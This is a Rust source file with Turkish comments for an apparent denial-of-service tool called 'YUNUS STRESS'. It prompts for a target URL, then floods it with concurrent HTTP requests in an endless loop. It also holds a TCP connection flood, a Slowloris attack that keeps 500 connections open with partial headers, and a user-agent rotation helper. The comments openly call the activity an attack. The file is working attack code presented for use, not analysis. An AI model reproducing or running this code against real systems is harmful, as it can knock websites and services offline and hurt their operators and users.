use reqwest::Client;
use std::sync::Arc;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::io::AsyncWriteExt; // TCP yazma işlemleri için
use std::io::{self, Write};
use rand::seq::SliceRandom; // cargo add rand yapmış olman gerekir
use std::time::Duration;

#[tokio::main]
async fn main() {
    // Terminali temizle
    print!("\x1b[2J\x1b[1;1H"); 
    
    // YEŞİL YUNUS LOGOSU
    println!("\x1b[32m");
    println!(r#"
            _.-''|''-._
         .-'     |     `-.
       .'  Control Center  `.
    .-'      (  v1.0  )      `-.
    |         \     /          |
    |          \   /           |        ___
    |           \ /            |     .-'   `-.
    |            V             |    /         \
    |                          |   |   🐬      |
    '---.__________________.---'    \         /
             |         |             `-.___.-'
             |  YUNUS  |
             |  STRESS |
    "#);
    
    println!("     [!] SYSTEM READY: OCEAN MODE ACTIVE");
    println!("     -----------------------------------");
    println!("\x1b[0m");

    print!("\x1b[32m[#] Hedef (URL): \x1b[0m");
    io::stdout().flush().unwrap();

    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    println!("\n\x1b[32m[!] Sürü saldırıya geçiyor... 🐬🐬🐬\x1b[0m\n");
    
    // Saldırıyı başlat
    start_dolphin_attack(target).await;
}

async fn start_dolphin_attack(target: String) {
    let client = Client::new();
    let semaphore = Arc::new(Semaphore::new(500)); // Hızı 500'e çıkardık!

    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let t = target.clone();

        tokio::spawn(async move {
            let res = c.get(t).send().await;
            match res {
                Ok(_) => {
                    // Rastgele yeşil tonlarında yunuslar
                    print!("\x1b[32m🐬\x1b[0m"); 
                }
                Err(_) => {
                    // Sunucu patlayınca çıkan dalga
                    print!("\x1b[31m🌊\x1b[0m"); 
                }
            }
            let _ = io::stdout().flush();
            drop(permit);
        });
        
        // Yunusların hızı (milisaniye)
        tokio::time::sleep(Duration::from_millis(2)).await;
    }
}
// --- SALDIRI MODÜLLERİ ---

// ... (üstteki importlar aynı kalabilir)
// Sadece çıktı kısmını (http_flood içindeki) şu şekilde güncelliyoruz:

async fn http_dolphin_flood(target: String) {
    let client = Client::new();
    let semaphore = Arc::new(Semaphore::new(300));
    
    println!("\n\x1b[32m[!] Yunuslar suya atladı... Hedef: {}\x1b[0m\n", target);

    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let t = target.clone();

        tokio::spawn(async move {
            let res = c.get(t).send().await;
            match res {
                Ok(_) => print!("\x1b[32m🐬\x1b[0m"), // Başarılı: Yeşil Yunus
                Err(_) => print!("\x1b[31m💥\x1b[0m"), // Hata: Kırmızı Patlama
            }
            let _ = io::stdout().flush();
            drop(permit);
        });
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
}

async fn tcp_flood(target: String) {
    // TCP için http:// kısmını temizle (127.0.0.1:8080 formatı lazım)
    let clean_target = target.replace("http://", "").replace("https://", "");
    println!("⚡ TCP Flood Başlatıldı: {}", clean_target);

    loop {
        let t = clean_target.clone();
        tokio::spawn(async move {
            match TcpStream::connect(t).await {
                Ok(_) => print!("+"),
                Err(_) => print!("?"),
            }
            let _ = io::stdout().flush();
        });
        tokio::time::sleep(Duration::from_millis(1)).await;
    }
}

async fn slowloris(target: String) {
    let clean_target = target.replace("http://", "").replace("https://", "");
    println!("🐢 Slowloris Başlatıldı: {}", clean_target);

    for i in 0..500 {
        let t = clean_target.clone();
        tokio::spawn(async move {
            if let Ok(mut stream) = TcpStream::connect(t).await {
                println!("Bağlantı {} açıldı", i);
                let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                loop {
                    tokio::time::sleep(Duration::from_secs(10)).await;
                    if let Err(_) = stream.write_all(b"X-a: b\r\n").await {
                        break; 
                    }
                }
            }
        });
    }
    // Ana fonksiyonun kapanmaması için bekle
    loop { tokio::time::sleep(Duration::from_secs(60)).await; }
}

// --- YARDIMCI ARAÇLAR ---

fn get_random_user_agent() -> &'static str {
    let agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Mobile/15E148",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/119.0"
    ];
    agents.choose(&mut rand::thread_rng()).unwrap_or(&agents[0])
}